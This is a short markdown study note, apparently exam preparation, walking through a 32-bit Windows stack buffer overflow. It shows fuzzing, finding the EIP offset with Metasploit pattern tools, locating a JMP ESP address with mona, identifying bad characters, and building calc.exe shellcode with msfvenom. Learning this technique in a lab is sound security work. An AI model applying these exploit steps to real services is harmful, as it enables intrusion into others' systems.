# Here is basic work throught

## Steps:
### simple 32bit Buffer Overflows
[simple Buffer Overflows](https://netsec.ws/?p=180)

1. Fuzz the app to crash and control the eip to AAAA => 0x41414141
write python or ruby fuzz script to make the app crash.

```
msf_pattern_create -l 1000



```
2. Finding the eip offset

if eip address is 43386F43, we can caculate the eip offset address

```

msf_pattern_offset -l 2000 -q 43386F43

[*] Exact match at offset 2004

python3 -c "print('A'*2004 + 'B'*4 + 'C'*500)"


```
eip address will be fill with 'BBBB'  0x42424242
esp address will be fill with 'CCCC'  0x43434343
so we need to make eip store JMP ESP
if we use immunity debug on windows, we can use mona command
we can use !mona find -s "\xff\xe4" -m exp.exe, it will return the base address such as 7C9D30D7
so the eip should be fill with "\xD7\x30\x9D\x7C", because we x86 cup is in little endian

```
!mona find -s "\xff\xe4" 

```


```

msf-nasm-shell
nasm > JMP ESP
00000000  FFE4              jmp esp

```



3. Identifying Bad Characters

we need to find out the bad characters, the blow \x00 is bad character.
if we use immunity debugger, we could use mona command.

[find bad character in buffer overflow](https://scx030c067.blogspot.com/2013/01/find-bad-character-in-buffer-overflow.html)

```

!mona config -set workingfolder c:\tmp\%p
!mona bytearray
!mona compare -f C:\tmp\brainpan\bytearray.bin -a 005FF910

!mona bytearray -b "\x00\x0d" 

"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"
"\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"
"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
"\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```


```
msfvenom -p windows/exec CMD=calc.exe -f python -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -i 3

```

so we need to send package ebp + eip + badchar to find out which badchar is valid.

```
patter = b"A"*2000 + b"\xD7\x30\x9D\x7C" + badchars
```

4. Finally package should be send in ebp + eip + nop + expcode
